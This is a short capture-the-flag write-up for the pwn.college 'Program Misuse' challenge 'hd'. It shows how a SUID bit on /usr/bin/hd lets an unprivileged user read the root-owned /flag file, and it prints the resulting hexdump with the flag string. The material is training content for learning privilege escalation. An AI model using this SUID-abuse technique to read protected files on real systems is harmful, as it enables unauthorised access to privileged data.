---
layout: page
title: "Challenge Name: hd"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/hd`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/hd
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/hd
```

-The `s` in `-rws` indicates it's a SUID binary.
-`hd` runs with **root privileges**.

## 🚀 Exploitation

The `hd` command is a shortcut for hexdump -C, used to view file contents in hexadecimal and ASCII format side-by-side.So this can simply reveal flag.

```bash
hd /flag
```

Output:
```
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 34 61 50 42  |pwn.college{4aPB|
00000010  31 35 6d 6e 64 42 4d 42  75 54 55 4e 35 39 59 2d  |15mndBMBuTUN59Y-|
00000020  2d 43 70 69 53 53 69 2e  64 52 54 4e 78 77 53 4d  |-CpiSSi.dRTNxwSM|
00000030  30 49 7a 4d 79 45 7a 57  7d 0a                    |0IzMyEzW}.|
0000003a
```

      
